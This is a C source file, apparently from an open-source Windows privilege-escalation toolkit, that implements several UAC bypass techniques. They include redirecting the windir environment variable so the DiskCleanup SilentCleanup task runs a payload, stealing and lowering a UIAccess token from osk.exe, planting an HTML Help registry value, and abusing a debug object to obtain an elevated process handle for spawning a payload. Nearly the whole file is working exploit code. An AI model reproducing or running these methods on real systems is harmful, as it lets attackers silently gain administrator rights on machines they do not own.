/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2025
*
*  TITLE:       TYRANID.C
*
*  VERSION:     3.69
*
*  DATE:        07 Jul 2025
*
*  James Forshaw autoelevation method(s)
*  Fine Dinning Tool (c) CIA
*
*  For description please visit original URL
*  https://tyranidslair.blogspot.ru/2017/05/exploiting-environment-variables-in.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-1.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
*  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
*  https://tyranidslair.blogspot.com/2019/02/accessing-access-tokens-for-uiaccess.html
*  https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* ucmDiskCleanupEnvironmentVariable
*
* Purpose:
*
* DiskCleanup task uses current user environment variables to build a path to the executable.
* Warning: this method works with AlwaysNotify UAC level.
*
*/
NTSTATUS ucmDiskCleanupEnvironmentVariable(
    _In_ LPWSTR lpszPayload
)
{
    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;

    WCHAR   szEnvVariable[MAX_PATH * 2];
    PWCHAR  psz;
    BOOL    quoteFix;

    do {

        if (_strlen(lpszPayload) > MAX_PATH)
            return STATUS_INVALID_PARAMETER;

        RtlSecureZeroMemory(szEnvVariable, sizeof(szEnvVariable));
        quoteFix = (g_ctx->dwBuildNumber >= NT_WIN10_21H2);

        //
        // Add quotes.
        //
        szEnvVariable[0] = L'\"';
        psz = &szEnvVariable[!!quoteFix];

        _strncpy(&szEnvVariable[1], MAX_PATH, lpszPayload, MAX_PATH);
        _strcat(szEnvVariable, L"\"");

        //
        // Set our controlled env.variable with payload.
        //
        if (!supSetEnvVariableEx(FALSE, NULL, T_WINDIR, psz))
            break;

        //
        // Run trigger task.
        //
        if (supStartScheduledTask(L"\\Microsoft\\Windows\\DiskCleanup", L"SilentCleanup"))
            MethodResult = STATUS_SUCCESS;

        //
        // Cleaup our env.variable.
        //
        supSetEnvVariableEx(TRUE, NULL, T_WINDIR, NULL);

    } while (FALSE);

    return MethodResult;
}

/*
* ucmxTokenModUIAccessMethodInitPhase
*
* Purpose:
*
* Convert dll to new entrypoint/exe.
*
*/
BOOL ucmxTokenModUIAccessMethodInitPhase(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize,
    _In_ LPCSTR EntryPointName,
    _In_ LPCWSTR PayloadFileName
)
{
    BOOL bResult = FALSE;

    WCHAR szBuffer[MAX_PATH * 2];

    //
    // Patch Fubuki to the new entry point and convert to EXE
    //
    if (supReplaceDllEntryPoint(ProxyDll,
        ProxyDllSize,
        EntryPointName,
        TRUE))
    {
        //
        // Drop modified Fubuki to the %temp%
        //
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, PayloadFileName);
        bResult = supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize);
    }

    return bResult;
}

/*
* ucmxTokenModUIAccessExec
*
* Purpose:
*
* Obtain token from UIAccess application, modify it and reuse for UAC bypass.
*
*/
NTSTATUS ucmxTokenModUIAccessExec(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize,
    _In_ LPCSTR EntryPointName,
    _In_ LPCWSTR PayloadFileName,
    _In_ UCM_METHOD Method
)
{
    NTSTATUS Status = STATUS_ACCESS_DENIED;
    LPWSTR lpszPayload = NULL;
    PSID pIntegritySid = NULL;
    HANDLE hDupToken = NULL, hProcessToken = NULL;
    SHELLEXECUTEINFO shinfo;
    SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
    TOKEN_MANDATORY_LABEL tml;
    SECURITY_QUALITY_OF_SERVICE sqos;
    OBJECT_ATTRIBUTES obja;
    WCHAR szBuffer[MAX_PATH * 2];

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

    do {
        //
        // Tweak and drop payload to %temp%.
        //
        if (!ucmxTokenModUIAccessMethodInitPhase(ProxyDll,
            ProxyDllSize,
            EntryPointName,
            PayloadFileName))
        {
            break;
        }

        //
        // Spawn OSK.exe process.
        //
        _strcpy(szBuffer, g_ctx->szSystemDirectory);
        _strcat(szBuffer, OSK_EXE);

        shinfo.cbSize = sizeof(shinfo);
        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        shinfo.lpFile = szBuffer;
        shinfo.nShow = SW_HIDE;
        if (!ShellExecuteEx(&shinfo))
            break;

        //
        // Open process token.
        //
        Status = NtOpenProcessToken(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
        if (!NT_SUCCESS(Status))
            break;

        //
        // Duplicate primary token.
        //
        sqos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
        sqos.ImpersonationLevel = SecurityImpersonation;
        sqos.ContextTrackingMode = 0;
        sqos.EffectiveOnly = FALSE;
        InitializeObjectAttributes(&obja, NULL, 0, NULL, NULL);
        obja.SecurityQualityOfService = &sqos;
        Status = NtDuplicateToken(hProcessToken, TOKEN_ALL_ACCESS, &obja, FALSE, TokenPrimary, &hDupToken);
        if (!NT_SUCCESS(Status))
            break;

        NtClose(hProcessToken);
        hProcessToken = NULL;

        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
        NtClose(shinfo.hProcess);
        shinfo.hProcess = NULL;

        //
        // Lower duplicated token IL from Medium+ to Medium.
        //
        Status = RtlAllocateAndInitializeSid(&MLAuthority,
            1, SECURITY_MANDATORY_MEDIUM_RID,
            0, 0, 0, 0, 0, 0, 0,
            &pIntegritySid);
        if (!NT_SUCCESS(Status))
            break;

        tml.Label.Attributes = SE_GROUP_INTEGRITY;
        tml.Label.Sid = pIntegritySid;

        Status = NtSetInformationToken(hDupToken, TokenIntegrityLevel, &tml,
            (ULONG)(sizeof(TOKEN_MANDATORY_LABEL) + RtlLengthSid(pIntegritySid)));
        if (!NT_SUCCESS(Status))
            break;

        RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
        RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
        si.cb = sizeof(STARTUPINFO);
        GetStartupInfo(&si);

        // 
        // Run second stage exe to perform some gui hacks.
        //
        _strcpy(szBuffer, g_ctx->szTempDirectory);
        _strcat(szBuffer, PKGMGR_EXE);

        if (Method == UacMethodTokenModUiAccess) {
            if (g_ctx->OptionalParameterLength == 0)
                lpszPayload = g_ctx->szDefaultPayload;
            else
                lpszPayload = g_ctx->szOptionalParameter;
        }

        if (CreateProcessAsUser(hDupToken,
            szBuffer,    //application
            lpszPayload, //command line
            NULL,
            NULL,
            FALSE,
            CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS,
            NULL,
            NULL,
            &si,
            &pi))
        {
            if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT)
                TerminateProcess(pi.hProcess, (UINT)-1);

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Status = STATUS_SUCCESS;
        }

    } while (FALSE);

    if (hProcessToken) NtClose(hProcessToken);

    if (shinfo.hProcess) {
        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
        NtClose(shinfo.hProcess);
    }
    if (hDupToken) NtClose(hDupToken);
    if (pIntegritySid) RtlFreeSid(pIntegritySid);

    _strcpy(szBuffer, g_ctx->szTempDirectory);
    _strcat(szBuffer, PayloadFileName);
    DeleteFile(szBuffer);

    return Status;
}

/*
* ucmTokenModUIAccessMethod
*
* Purpose:
*
* Obtain token from UIAccess application, modify it and reuse for UAC bypass.
*
*/
NTSTATUS ucmTokenModUIAccessMethod(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    return ucmxTokenModUIAccessExec(ProxyDll, ProxyDllSize,
        FUBUKI_ENTRYPOINT_UIACCESS2, PKGMGR_EXE,
        UacMethodTokenModUiAccess);
}

/*
* ucmTokenModUIAccessMethod2
*
* Purpose:
*
* Variant inspired by Stefan Kanthak findings. Based on same tyranid UIAccess bypass.
*
*/
NTSTATUS ucmTokenModUIAccessMethod2(
    _In_ PVOID ProxyDll,
    _In_ DWORD ProxyDllSize
)
{
    HKEY hKey;
    LRESULT lResult;
    NTSTATUS Status = STATUS_ACCESS_DENIED;
    SIZE_T sz;
    WCHAR szPayload[MAX_PATH * 2];

    _strcpy(szPayload, g_ctx->szTempDirectory);
    _strcat(szPayload, THEOLDNEWTHING);
    _strcat(szPayload, TEXT(".dll"));

    if (supWriteBufferToFile(szPayload, ProxyDll, ProxyDllSize)) {

        hKey = NULL;
        lResult = RegCreateKeyEx(HKEY_CURRENT_USER, T_HTMLHELP_AUTHOR, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
        if (lResult == ERROR_SUCCESS) {

            sz = (1 + _strlen(szPayload)) * sizeof(WCHAR);
            lResult = RegSetValueEx(hKey,
                T_LOCATION,
                0,
                REG_SZ,
                (BYTE*)szPayload,
                (DWORD)sz);

            if (lResult == ERROR_SUCCESS) {

                Status = ucmxTokenModUIAccessExec(ProxyDll,
                    ProxyDllSize,
                    FUBUKI_ENTRYPOINT_UIACCESS3,
                    PKGMGR_EXE,
                    UacMethodTokenModUiAccess2);

            }

            RegCloseKey(hKey);
        }

        RegDeleteKey(HKEY_CURRENT_USER, T_HTMLHELP_AUTHOR);
        DeleteFile(szPayload);
    }
    return Status;
}

/*
* ucmxCreateProcessFromParent
*
* Purpose:
*
* Create new process using parent process handle.
*
*/
NTSTATUS ucmxCreateProcessFromParent(
    _In_ HANDLE ParentProcess,
    _In_ LPWSTR Payload)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    SIZE_T size = 0x30;

    STARTUPINFOEX si;
    PROCESS_INFORMATION pi;

    RtlSecureZeroMemory(&pi, sizeof(pi));
    RtlSecureZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEX);

    do {
        if (size > 1024)
            break;

        si.lpAttributeList = supHeapAlloc(size);
        if (si.lpAttributeList) {

            if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
                if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), 0, 0)) //-V616
                {
                    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
                    si.StartupInfo.wShowWindow = SW_SHOW;

                    if (CreateProcess(NULL,
                        Payload,
                        NULL,
                        NULL,
                        FALSE,
                        CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
                        NULL,
                        g_ctx->szSystemRoot,
                        (LPSTARTUPINFO)&si,
                        &pi))
                    {
                        CloseHandle(pi.hThread);
                        CloseHandle(pi.hProcess);
                        status = STATUS_SUCCESS;
                    }
                }
            }

            if (si.lpAttributeList)
                DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine

            supHeapFree(si.lpAttributeList);
        }
    } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);

    return status;
}

/*
* ucmDebugObjectMethod
*
* Purpose:
*
* Bypass UAC by direct RPC call to APPINFO and DebugObject use.
*
*/
NTSTATUS ucmDebugObjectMethod(
    _In_ LPWSTR lpszPayload
)
{
    //UINT retryCount = 0;
    BOOL debugObjectSet = FALSE;
    NTSTATUS status = STATUS_ACCESS_DENIED;
    HANDLE dbgHandle = NULL, dbgProcessHandle = NULL, dupHandle = NULL;
    PROCESS_INFORMATION procInfo;
    DEBUG_EVENT dbgEvent;
    WCHAR szProcess[MAX_PATH * 2];

    do {

        //
        // Spawn initial non elevated victim process under debug.
        //
        //do { /* remove comment for attempt to spam debug object within thread pool */

        _strcpy(szProcess, g_ctx->szSystemDirectory);
        _strcat(szProcess, WINVER_EXE);

        if (!AicLaunchAdminProcess(szProcess,
            szProcess,
            0,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_ctx->szSystemRoot,
            T_DEFAULT_DESKTOP,
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //
        // Capture debug object handle.
        //
        status = supGetProcessDebugObject(procInfo.hProcess,
            &dbgHandle);

        if (!NT_SUCCESS(status)) {
            TerminateProcess(procInfo.hProcess, 0);
            CloseHandle(procInfo.hThread);
            CloseHandle(procInfo.hProcess);
            procInfo.hThread = NULL;
            procInfo.hProcess = NULL;
            break;
        }

        //
        // Detach debug and kill non elevated victim process.
        //
        NtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hThread);
        CloseHandle(procInfo.hProcess);

        //} while (++retryCount < 20);

        //
        // Spawn elevated victim under debug.
        //
        _strcpy(szProcess, g_ctx->szSystemDirectory);
        _strcat(szProcess, COMPUTERDEFAULTS_EXE);
        RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
        RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));

        if (!AicLaunchAdminProcess(szProcess,
            szProcess,
            1,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_ctx->szSystemRoot,
            T_DEFAULT_DESKTOP,
            NULL,
            INFINITE,
            SW_HIDE,
            &procInfo))
        {
            status = STATUS_UNSUCCESSFUL;
            break;
        }

        //
        // Update thread TEB with debug object handle to receive debug events.
        //
        DbgUiSetThreadDebugObject(dbgHandle);
        debugObjectSet = TRUE;

        //
        // Debugger wait cycle.
        //
        while (1) {
            if (!WaitForDebugEvent(&dbgEvent, INFINITE))
                break;

            switch (dbgEvent.dwDebugEventCode) {
                //
                // Capture initial debug event process handle.
                //
            case CREATE_PROCESS_DEBUG_EVENT:
                dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
                break;
            }

            if (dbgProcessHandle)
                break;

            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
        }

        if (dbgProcessHandle) {
            //
            // Create new handle from captured with PROCESS_ALL_ACCESS.
            //
            status = NtDuplicateObject(dbgProcessHandle,
                NtCurrentProcess(),
                NtCurrentProcess(),
                &dupHandle,
                PROCESS_ALL_ACCESS,
                0,
                0);

            if (NT_SUCCESS(status)) {
                //
                // Run new process with parent set to duplicated process handle.
                //
                ucmxCreateProcessFromParent(dupHandle, lpszPayload);
                NtClose(dupHandle);
                dupHandle = NULL;
            }
        }

    } while (FALSE);

    //
    // Cleanup section.
    //
    if (debugObjectSet) {
#pragma warning(push)
#pragma warning(disable: 6387)
        DbgUiSetThreadDebugObject(NULL);
#pragma warning(pop)
    }

    if (dbgHandle) {
        NtClose(dbgHandle);
    }

    if (dbgProcessHandle) {
        CloseHandle(dbgProcessHandle);
    }

    // Release victim process if still open
    if (procInfo.hThread) {
        CloseHandle(procInfo.hThread);
    }

    if (procInfo.hProcess) {
        TerminateProcess(procInfo.hProcess, 0);
        CloseHandle(procInfo.hProcess);
    }

    supSetGlobalCompletionEvent();
    return status;
}
